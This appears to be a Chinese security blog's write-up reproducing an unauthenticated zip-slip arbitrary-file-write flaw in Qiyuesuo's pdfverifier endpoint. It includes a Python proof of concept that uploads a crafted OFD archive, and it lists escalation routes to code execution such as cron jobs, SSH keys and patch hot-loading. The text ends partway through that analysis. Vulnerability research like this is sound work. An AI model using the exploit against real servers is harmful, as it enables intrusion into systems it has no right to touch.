@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            契约锁pdfverifier漏洞分析 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        契约锁pdfverifier漏洞分析
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-11-03 16:16:47</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Nov 03 2025 16:17:37 GMT+0800">2025-11-03 16:17:37</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java/">Java</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java/">Java</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>4.9k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>21 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>护网的时候就有看到这个漏洞，现在终于有时间来复现一下。</p>
+<p>整理一下环境搭建中遇到的问题，以及复现过程中踩的坑。</p>
+<p>我这里使用契约锁4.3.4，jdk8u341，360zip，win11进行复现。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="应用目录分析"><a href="#应用目录分析" class="headerlink" title="应用目录分析"></a>应用目录分析</h2><p>先去某鱼收一个安装包。解压完后的目录长这样：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761974973651-c06ecff8-940e-46a1-9768-8ab87280fc9e.png"  alt="img"></p>
+<p>bin&#x2F;start.bat是启动脚本，我们打开加上远程调试参数：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761982639884-c5fddf44-6f61-4a32-a00e-d299e005ff36.png"  alt="img"></p>
+<p>从这里也可以发现，契约锁会同时运行3个springboot进程。</p>
+<p>对应的端口可以去jar包的application.properties里面看。</p>
+<p>privapp.jar对应9180，privoss.jar对应9181，privopen对应9182</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761982758906-c42a5967-7aa2-4bec-8c95-85c6b5e76968.png"  alt="img"></p>
+<p>官方建议只对外开放<code>9180</code>端口<code>pdfverifier</code>接口的漏洞便是在这个端口，对应的jar包为<code>privapp.jar</code>。所以我们上面只在privapp.jar处加调试参数。</p>
+<p>除了上面的三个主要jar，还有一个libs目录，里面是大量第三方依赖，但是也有一些priv开头的jar：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761983030553-7997fc99-ddba-4984-bb9b-ef8e940af4e3.png"  alt="img"></p>
+<p>这些priv是上面三个主要jar的公共依赖。</p>
+<p>然后日志在logs目录下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761997159073-1665f48d-20ee-48b9-9039-2be4f3557a08.png"  alt="img"></p>
+<p>console.log里是当天的。</p>
+<h2 id="补丁结构分析"><a href="#补丁结构分析" class="headerlink" title="补丁结构分析"></a>补丁结构分析</h2><p>去官网下载补丁：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.qiyuesuo.com/more/security/servicepack" >https://www.qiyuesuo.com/more/security/servicepack<i class="fas fa-external-link-alt"></i></a></p>
+<p>补丁下载链接为：<a class="link"   target="_blank" rel="noopener" href="https://dl.qiyuesuo.com/private/security/1.4.0/private-security-patch.package.tar.gz" >https://dl.qiyuesuo.com/private/security/1.4.0/private-security-patch.package.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
+<p>将1.4.0替换成别的数字，即可下载任意版本补丁。</p>
+<p>补丁目录：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761983395497-653e64ea-337d-452c-8b4f-dc578c9cbb8f.png"  alt="img"></p>
+<p>读一下README</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761983429758-c896364c-6b3d-4ed1-95dd-29095afaea01.png"  alt="img"></p>
+<p>需要把private-security-loader-1.0.0.jar放入libs目录，然后private-security-patch.jar放入security目录。</p>
+<p>知道这些后，我们就可以开始搭建idea项目了。</p>
+<h2 id="idea项目搭建"><a href="#idea项目搭建" class="headerlink" title="idea项目搭建"></a>idea项目搭建</h2><p>需要添加为lib的有：三个主要jar包；libs目录中契约锁相关的jar；libs里面的其他依赖；补丁包里的两个jar</p>
+<p>需要反编译成源码的有：privapp.jar；libs目录中契约锁相关的jar；补丁包里的两个jar</p>
+<p>把需要反编译的全打包成zip，然后拖到jd-gui一起反编译即可，最后解压到idea，添加为源。</p>
+<p>用之前在审计U8cloud时的脚本，把com.qiyuesuo和net.qiyuesuo的jar全部筛选出来：</p>
+<p>注释没改不用看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_jar_conditions</span>(<span class="params">jar_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查 JAR 文件的第一层目录中是否包含 &#x27;nc&#x27;、&#x27;u8c&#x27; 或者 com/yonyou&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(jar_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> jar:</span><br><span class="line">            file_names = jar.namelist()</span><br><span class="line">            first_level_dirs = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 获取 JAR 文件中的第一层目录</span></span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> file_names:</span><br><span class="line">                first_level = file.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                first_level_dirs.add(first_level)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查是否满足条件</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;com&#x27;</span> <span class="keyword">in</span> first_level_dirs:</span><br><span class="line">                <span class="comment"># 如果第一层目录是 &#x27;com&#x27;，检查第二层是否为 &#x27;qiyuesuo&#x27;</span></span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> file_names:</span><br><span class="line">                    parts = file.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span> <span class="keyword">and</span> parts[<span class="number">0</span>] == <span class="string">&#x27;com&#x27;</span> <span class="keyword">and</span> parts[<span class="number">1</span>] == <span class="string">&#x27;qiyuesuo&#x27;</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;com&#x27;</span> <span class="keyword">in</span> first_level_dirs:</span><br><span class="line">                <span class="comment"># 如果第一层目录是 &#x27;com&#x27;，检查第二层是否为 &#x27;qiyuesuo&#x27;</span></span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> file_names:</span><br><span class="line">                    parts = file.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span> <span class="keyword">and</span> parts[<span class="number">0</span>] == <span class="string">&#x27;net&#x27;</span> <span class="keyword">and</span> parts[<span class="number">1</span>] == <span class="string">&#x27;qiyuesuo&#x27;</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">f&quot;无法处理 JAR 文件 <span class="subst">&#123;jar_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy_jar_files</span>(<span class="params">source_dir, target_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;递归提取目录下的所有 JAR 包，并按 dir1_dir2_xxx.jar 格式重命名&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        os.makedirs(target_dir)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历源目录中的所有文件</span></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(source_dir):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.jar&#x27;</span>):</span><br><span class="line">                jar_path = os.path.join(root, file)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 判断该 JAR 包是否满足条件</span></span><br><span class="line">                <span class="keyword">if</span> check_jar_conditions(jar_path):</span><br><span class="line">                    <span class="comment"># 获取文件的相对路径并生成新的文件名</span></span><br><span class="line">                    relative_path = os.path.relpath(root, source_dir)</span><br><span class="line">                    new_filename = relative_path.replace(os.sep, <span class="string">&#x27;_&#x27;</span>) + <span class="string">&#x27;_&#x27;</span> + file</span><br><span class="line">                    target_path = os.path.join(target_dir, new_filename)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 检查目标目录是否已有相同文件名</span></span><br><span class="line">                    counter = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> os.path.exists(target_path):</span><br><span class="line">                        <span class="comment"># 如果文件已存在，给文件加上数字后缀</span></span><br><span class="line">                        name, ext = os.path.splitext(file)</span><br><span class="line">                        target_path = os.path.join(target_dir, <span class="string">f&quot;<span class="subst">&#123;new_filename.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]&#125;</span>_<span class="subst">&#123;counter&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span>)</span><br><span class="line">                        counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 复制 JAR 文件</span></span><br><span class="line">                    shutil.copy(jar_path, target_path)</span><br><span class="line">                    logging.info(<span class="string">f&quot;已复制符合条件的 JAR 文件: <span class="subst">&#123;jar_path&#125;</span> -&gt; <span class="subst">&#123;target_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 输入源目录和目标目录</span></span><br><span class="line">    source_directory = <span class="string">&#x27;./&#x27;</span>  <span class="comment"># 替换为源目录路径</span></span><br><span class="line">    target_directory = <span class="string">&#x27;D:/qiyuesuoJars&#x27;</span>  <span class="comment"># 替换为目标目录路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 复制符合条件的 JAR 文件</span></span><br><span class="line">    copy_jar_files(source_directory, target_directory)</span><br></pre></td></tr></table></figure>
+
+<p>最终筛出来这些包：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762153050685-e7b10573-be9d-4d7e-8737-8265fde3cfbf.png"  alt="img"></p>
+<p>最终大概长这样，我这里略有不同，反正要用的包全部添加了就行：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761983630472-66cee24a-f0b5-456a-8e21-eb5b2aa4f08a.png"  alt="img"></p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>文章里看到过privapp.jar无法正常解压的情况。解决方法如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761983709843-888f7959-49b3-4331-a13d-e37e9ef08c87.png"  alt="img"></p>
+<h1 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h1><p>privapp.jar打开，有两个文件夹比较显眼，一个是config，一个是security：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761988198168-9c67e97d-c8b1-4732-aa2b-bb666a5bf476.png"  alt="img"></p>
+<p>这两个目录大概率有鉴权相关操作。后面发现，security里是具体实现，config里配置了路由：</p>
+<p>PrivappConfigurer：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761989826438-fbc9ffeb-725b-4f5c-9085-653de3269057.png"  alt="img"></p>
+<p>allowed字符数组里，定义了不需要鉴权的路由，因为有&#x2F;captcha, &#x2F;login等，很明显就是不用鉴权的。要注意的是，所有路由访问时都得在前面加上&#x2F;api，因为下面allowedArr里做了字符串拼接操作。</p>
+<p>我们今天的主角也在里面：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761989974161-14eb9791-3f44-4950-97c8-1f5bc636b360.png"  alt="img"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h2><p>这里的漏洞是一个解压穿越漏洞。</p>
+<p>全局搜索&#x2F;pdfverifier：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761990057070-267b2d18-5748-475b-9e89-4553032c2bc7.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761990236933-339043c3-bed3-4309-a486-a2ea6cbf0cf5.png"  alt="img"></p>
+<p>说实话，我还是不太清楚，为什么要通过&#x2F;api&#x2F;pdfverifier来访问。类上面写的path不是 &#x2F;pdfverifier吗？我的开发基础太差了，之后还得好好学习一下。</p>
+<p>我们的漏洞方法是这里的verify。</p>
+<p>前面两行没什么，就是获取上传文件的字节和获取扩展名。跟进doVerfify：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761990395981-0f29717f-2b81-4235-b33d-8245694183e5.png"  alt="img"></p>
+<p>这里只允许pdf和odf文件，且pdf不能是加密的。我们跟进红框处的verify方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761990539283-149741bf-95b0-4dda-874e-9515f6a710f1.png"  alt="img"></p>
+<p>这里的common-ofd似乎也是自研的，我在网上没搜到，所以应该也归类到业务代码进行反编译。不过能发现common-ofd里面也是net.qiyuesuo开头的，所以可以写脚本把有这两层目录的jar包全部筛选出来，这样就能找到所有业务相关jar了。</p>
+<p>decompre就是decompress，这里我们跟进红框，很明显就是一个解压操作：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761990789886-3a59900d-9f28-43f1-bb30-ad88eabf54f6.png"  alt="img"></p>
+<p>断点处直接拿zipEntry的name进行拼接了，存在目录穿越的漏洞。所以我们可以实现任意写文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_zip</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">f&#x27;bad.ofd&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;1.txt&quot;</span>, <span class="string">f&quot;../<span class="subst">&#123;filename&#125;</span>&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    gen_zip(<span class="string">&quot;123aaazxc.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:9180/api/pdfverifier&quot;</span></span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;bad.ofd&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    proxy = &#123;</span><br><span class="line">        <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: file&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>由于默认写在C盘，所以只往前写一个目录，写到Temp里，不然可能报错，说没有写权限：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762002128441-1b994e1c-2504-4813-a673-45eaeb0e3c48.png"  alt="img"></p>
+<p>成功写入：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762002187257-28569487-bea3-4364-a7c7-eae2dad2706e.png"  alt="img"></p>
+<p>但是，springboot应用，怎么从任意写提升到RCE？</p>
+<p>1、linux可以写计划任务。</p>
+<p>缺点：这里是用qiyuesuo用户起的web应用，没权限</p>
+<p>2、覆盖charset.jar</p>
+<p>缺点：不知道jdk路径，得猜，而且方法很麻烦</p>
+<p>3、写模板文件</p>
+<p>缺点：如果模板文件从jar里读取，就写不了；而且这里没有Thymeleaf等模板解析器</p>
+<p>4、写sshkey</p>
+<p>缺点：还是权限问题，而且容易被发现</p>
+<p>这里就要学到一种新的RCE方式，热加载补丁。</p>
+<h2 id="热加载补丁"><a href="#热加载补丁" class="headerlink" title="热加载补丁"></a>热加载补丁</h2><p>再回顾一下补丁里的README文件：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761996906645-aed611b2-c427-478f-bae9-16069fad9a54.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761996924542-a4a9c40b-8bb7-4bec-84b3-57ea64a629ee.png"  alt="img"></p>
+<p>上面提到，把priv-loader放到libs后，在服务启动的情况下，直接将patch放入security文件夹，然后等待30s，查看日志是否有输出。</p>
+<p>这里可以猜测，这里的补丁是不是通过热加载的方式打上的？这里又提到“被重新加载的类”，那么类在重新加载的时候，会不会触发里面的静态方法和无参构造呢？</p>
+<p>通过名字可以知道，priv-loader是负责加载补丁包的，而patch是真正的补丁内容。我们这里看一下priv-loader的源码：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761997822837-ed2b11c2-7c0f-4cc7-aea0-96729fc4569d.png"  alt="img"></p>
